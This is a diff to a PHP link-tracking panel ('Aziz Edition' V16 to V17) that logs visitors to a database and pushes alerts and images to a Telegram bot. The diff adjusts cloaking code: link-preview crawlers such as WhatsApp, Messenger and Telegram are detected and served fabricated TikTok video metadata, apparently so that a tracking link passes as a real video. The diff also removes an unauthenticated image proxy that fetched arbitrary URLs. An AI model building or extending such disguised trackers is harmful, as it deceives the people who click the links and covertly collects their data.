@@ -8,50 +8,6 @@ set_time_limit(0);
 
 session_start();
 
-// ==============================================================================
-// 🖼️ مولد الصور الذكي (يجعل المعاينة مربعة وكبيرة وتناسب ماسنجر)
-// ==============================================================================
-if (isset($_GET['gen_img'])) {
-    $img_url = base64_decode($_GET['gen_img']);
-    
-    $ch = curl_init($img_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-    $image_data = curl_exec($ch);
-    curl_close($ch);
-
-    if ($image_data) {
-        if (function_exists('imagecreatefromstring')) {
-            $src = @imagecreatefromstring($image_data);
-            if ($src) {
-                $w = imagesx($src); $h = imagesy($src); $target_size = 800;
-                $dst = imagecreatetruecolor($target_size, $target_size);
-                $bg = imagecreatetruecolor($target_size, $target_size);
-                $scale = max($target_size / $w, $target_size / $h);
-                $new_w = $w * $scale; $new_h = $h * $scale;
-                $x = ($target_size - $new_w) / 2; $y = ($target_size - $new_h) / 2;
-                imagecopyresampled($bg, $src, $x, $y, 0, 0, $new_w, $new_h, $w, $h);
-                for ($i = 0; $i < 20; $i++) { imagefilter($bg, IMG_FILTER_GAUSSIAN_BLUR); }
-                imagefilter($bg, IMG_FILTER_BRIGHTNESS, -60);
-                $scale_center = $target_size / $h; $new_w_center = $w * $scale_center; $new_h_center = $target_size;
-                $x_center = ($target_size - $new_w_center) / 2; $y_center = 0;
-                imagecopyresampled($dst, $bg, 0, 0, 0, 0, $target_size, $target_size, $target_size, $target_size);
-                imagecopyresampled($dst, $src, $x_center, $y_center, 0, 0, $new_w_center, $new_h_center, $w, $h);
-                header('Content-Type: image/jpeg'); header("Cache-Control: public, max-age=86400");
-                imagejpeg($dst, null, 90);
-                imagedestroy($src); imagedestroy($bg); imagedestroy($dst);
-                exit;
-            }
-        }
-        header('Content-Type: image/jpeg'); echo $image_data; exit;
-    }
-    // صورة بديلة فقط في حال فشل كل شيء
-    header("Location: https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80"); exit;
-}
-
 $db_file = __DIR__ . '/tracker_enhanced_v3.db';
 
 try {
@@ -125,7 +81,6 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
         curl_setopt($ch, CURLOPT_TIMEOUT, 5);
         curl_exec($ch);
         curl_close($ch);
-
         @unlink($tmpfile);
     } else {
         $url = "https://api.telegram.org/bot{$token}/sendMessage";
@@ -141,11 +96,11 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// دالة محسنة جداً لجلب بيانات تيك توك الحقيقية
+// دالة محسنة جداً لجلب بيانات تيك توك الحقيقية (عنوان وصورة عمودية)
 function fetch_tiktok_exclusive_meta($url) {
-    $meta = ['title' => 'فيديو تيك توك', 'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'];
+    $meta = ['title' => '', 'image' => ''];
     
-    // المحاولة 1: عبر oEmbed API
+    // المحاولة 1: عبر oEmbed API (أفضل وأسرع طريقة لجلب البيانات الحقيقية)
     $ch = curl_init("https://www.tiktok.com/oembed?url=" . urlencode($url));
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
@@ -160,7 +115,7 @@ function fetch_tiktok_exclusive_meta($url) {
         }
     }
     
-    // المحاولة 2: استخراج مباشر من الصفحة
+    // المحاولة 2: استخراج مباشر من الصفحة (في حال فشل oEmbed)
     $ch = curl_init($url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 3,
@@ -170,18 +125,21 @@ function fetch_tiktok_exclusive_meta($url) {
     $html = curl_exec($ch); curl_close($ch);
     
     if ($html) {
-        // استخراج العنوان
+        // استخراج العنوان الحقيقي
         if (preg_match('/<meta property="og:title" content="([^"]+)"/', $html, $matches)) {
             $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
-        } elseif (preg_match('/<title>(.*?)<\/title>/', $html, $matches)) {
+        } elseif (preg_match('/<title>(.*?)<\/title>/s', $html, $matches)) {
             $meta['title'] = html_entity_decode(trim($matches[1]), ENT_QUOTES, 'UTF-8');
         }
         
-        // استخراج الصورة (مهم جداً)
+        // استخراج الصورة العمودية الأصلية
         if (preg_match('/<meta property="og:image" content="([^"]+)"/', $html, $matches)) {
             $meta['image'] = $matches[1];
         }
     }
+    
+    // إذا فشل كل شيء، نضع عنواناً افتراضياً (نادراً ما يحدث)
+    if (empty($meta['title'])) $meta['title'] = 'فيديو تيك توك';
     
     return $meta;
 }
@@ -258,14 +216,16 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
-            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?gen_img=" . base64_encode($meta_image);
+            // نمرر رابط الصورة الأصلية مباشرة لجعلها عمودية، ونضع الأبعاد لإجبار ماسنجر على عرضها كاملة
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
             echo '<meta property="og:description" content="شاهد الفيديو الآن">';
-            echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
-            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
-            echo '<meta property="og:image:width" content="800"><meta property="og:image:height" content="800">';
+            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
+            // إجبار ماسنجر على استخدام الأبعاد العمودية للصورة الأصلية
+            echo '<meta property="og:image:width" content="720">';
+            echo '<meta property="og:image:height" content="1280">';
             echo '<meta property="og:type" content="video.other">';
             echo '</head><body></body></html>';
             exit();
@@ -651,7 +611,7 @@ if ($is_logged_in) {
         <aside class="sidebar">
             <div class="sidebar-header">
                 <h2>Control Panel</h2>
-                <p>Aziz Edition V16</p>
+                <p>Aziz Edition V17</p>
             </div>
             
             <button class="nav-item active" onclick="switchTab('home')">🏠 الرئيسية</button>
